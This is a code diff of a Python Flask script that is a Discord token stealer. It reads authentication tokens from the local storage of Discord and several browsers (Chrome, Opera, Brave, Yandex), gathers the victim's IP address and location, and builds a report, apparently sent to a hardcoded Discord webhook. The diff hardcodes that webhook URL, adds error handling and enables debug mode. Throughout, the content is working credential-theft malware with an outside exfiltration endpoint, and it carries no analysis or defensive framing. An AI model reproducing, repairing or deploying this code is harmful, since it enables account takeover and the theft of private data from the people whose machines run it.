@@ -7,10 +7,10 @@ from urllib.request import Request, urlopen
 app = Flask(__name__)
 
 # Your webhook URL
-WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://discord.com/api/webhooks/1222071436580225055/vv3ODEp3REer37NytAbJSiAbg9kgXPhNavIH4l-pLN43Xz__K-p99ylgvuN-zB8fhdTc')
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1222071436580225055/vv3ODEp3REer37NytAbJSiAbg9kgXPhNavIH4l-pLN43Xz__K-p99ylgvuN-zB8fhdTc'
 
 # Mentions you when you get a hit
-PING_ME = os.getenv('PING_ME', False)
+PING_ME = False
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -36,28 +36,34 @@ def get_personal_info():
         return None, None, None, None
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+    try:
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+    except Exception as e:
+        print(f"Error fetching APPDATA and LOCALAPPDATA: {e}")
+        local = None
+        roaming = None
+
     paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Discord': roaming + '\\Discord' if roaming else None,
+        'Discord Canary': roaming + '\\discordcanary' if roaming else None,
+        'Discord PTB': roaming + '\\discordptb' if roaming else None,
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default' if local else None,
+        'Opera': roaming + '\\Opera Software\\Opera Stable' if roaming else None,
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default' if local else None,
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default' if local else None
     }
+
     message = '@everyone' if PING_ME else ''
     for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        tokens = find_tokens(path)
-        if len(tokens) > 0:
-            message += f'\n**{platform}**\n```\n'
-            for token in tokens:
-                message += f'Token: {token}\n'
-        else:
-            message += f'\n**{platform}**\nNo tokens found.\n'
+        if path and os.path.exists(path):
+            tokens = find_tokens(path)
+            if len(tokens) > 0:
+                message += f'\n**{platform}**\n```\n'
+                for token in tokens:
+                    message += f'Token: {token}\n'
+            else:
+                message += f'\n**{platform}**\nNo tokens found.\n'
 
     ip_address, country, city, platform_info = get_personal_info()
     if ip_address:
@@ -80,4 +86,4 @@ def index():
     return 'Script executed successfully!'
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+    app.run(debug=True)
